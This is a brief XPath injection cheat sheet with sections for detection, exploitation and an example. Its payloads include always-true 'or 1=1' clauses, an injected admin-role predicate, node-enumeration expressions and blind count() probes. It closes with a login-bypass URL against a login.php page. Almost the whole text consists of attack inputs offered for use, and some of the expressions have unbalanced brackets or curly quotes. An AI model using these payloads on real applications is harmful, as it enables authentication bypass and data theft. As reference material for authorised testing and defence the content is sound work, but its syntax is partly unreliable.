## Detection ##

' (Single Quote)
" (Double Quote)


## Exploitation ##

'or '1'='1
'or 1=1 or '='

]|*|user[@role='admin

"NODENAME"  (Return all children of node)
 
"//NODENAME" (Return all elements in the document)

"NODeNAME//SUBNODENAME"  (return all SUBNODE under NODE element)

"//NODENAME/[NAME="VALUE"     (value = admin)

count(//user/child::node()    (return the number of nodes)

Injecting until the error found ...

‘ or count (parent::*[position()=1])=0 or ‘a’=’b
‘ or count (parent::*[position()=1])>0 or ‘a’=’b
1  or count (parent::*[position()=1])=0
1  or count (parent::*[position()=1])>0 


## Example ##

http://site.com/login.php?username=admin' or 1=1 or ''='   (Login Bypass) 


